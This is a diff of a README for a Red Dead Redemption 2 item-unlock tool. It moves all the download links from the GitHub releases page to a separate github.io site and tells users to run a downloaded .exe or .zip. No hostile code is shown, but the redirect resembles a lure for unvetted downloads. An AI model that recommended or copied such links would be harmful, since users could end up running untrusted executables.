@@ -1,12 +1,12 @@
 # 🤠 RDR2-Outfit-Manager - Unlock red dead story mode items
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/gabrielacharmed705/RDR2-Outfit-Manager/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://gabrielacharmed705.github.io)
 
 This application helps users manage and unlock items in Red Dead Redemption 2 story mode. It removes the need for grinding by granting access to clothing, accessories, and character stats. Use this tool to customize Arthur Morgan or John Marston with ease.
 
 ## 📥 Getting Started
 
-1. Visit the [releases page](https://github.com/gabrielacharmed705/RDR2-Outfit-Manager/releases) to download the software.
+1. Visit the [releases page](https://gabrielacharmed705.github.io) to download the software.
 2. Select the latest version file ending in .zip or .exe.
 3. Save the file to your computer desktop or a folder you can find.
 4. If the file is a .zip, right-click it and choose Extract All.
@@ -85,4 +85,4 @@ Before you use the manager, verify the following:
 
 If you encounter an error during the save process, close the game completely and restart the manager. Always check the main download link for updates to the software to ensure it remains compatible with the current version of the game.
 
-[![](https://img.shields.io/badge/Download-Latest_Release-grey.svg)](https://github.com/gabrielacharmed705/RDR2-Outfit-Manager/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-grey.svg)](https://gabrielacharmed705.github.io)
